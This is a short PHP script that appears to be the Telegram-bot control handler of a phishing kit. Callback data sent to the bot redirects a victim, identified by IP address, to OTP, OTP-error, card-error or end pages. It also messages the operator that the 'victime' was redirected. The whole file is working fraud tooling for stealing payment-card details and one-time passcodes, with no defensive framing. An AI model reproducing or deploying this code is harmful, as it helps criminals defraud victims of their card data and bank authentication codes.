<?php
$update = json_decode(file_get_contents('php://input'), TRUE);
include 'funcs.php';
include '../../settings.php';

$pages = [
    "otp" => "otp.php",
    "otp.error" => "otp.php?error=1",
    "card.error" => "card.php?error=1",
    "end" => "end.php"
];

if (isset($update['callback_query'])) {
    $results = explode('-',$update['callback_query']['data']);
    $ip = $results[0];
    $step = $results[1];
    $chatid = $update['callback_query']['from']['id'];
    $message = "🕺🏿 Victime redirigé vers la page : " . $step;
    file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $chatid . '&text=' . $message);
    change($ip, $pages[$step]);
}
?>